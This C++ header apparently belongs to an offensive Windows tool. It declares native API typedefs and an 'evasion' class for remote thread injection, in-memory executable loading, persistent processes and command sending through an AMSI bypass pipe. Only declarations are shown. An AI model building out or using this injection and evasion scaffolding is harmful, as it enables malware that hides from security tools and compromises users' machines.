#include <Windows.h>
#include <string>
#include <vector>
#include "core.h"



typedef NTSTATUS(NTAPI* NtProtectVirtualMemoryFunctionPointer)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    OUT PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemoryFunctionPointer)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);
// needed to replace CreateRemoteThread
typedef NTSTATUS(WINAPI* NtCreateThreadExFunctionPointer)
(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN LPVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN LPTHREAD_START_ROUTINE lpStartAddress,
    IN LPVOID lpParameter,
    IN BOOL CreateSuspended,
    IN ULONG StackZeroBits,
    IN ULONG SizeOfStackCommit,
    IN ULONG SizeOfStackReserve,
    OUT LPVOID lpBytesBuffer
    );

struct NtCreateThreadExBuffer
{
    ULONG Size;
    ULONG Unknown1;
    ULONG Unknown2;
    PULONG Unknown3;
    ULONG Unknown4;
    ULONG Unknown5;
    ULONG Unknown6;
    PULONG Unknown7;
    ULONG Unknown8;
};

class evasion
{
private:
public:
    static void inject_remote_thread(int pid);

    static int run_portable_executable(void* image);

    static PROCESS_INFO* create_persistent_process();

    static void send_command(const char* cmd, HANDLE amsiBypassWrPipe);

};

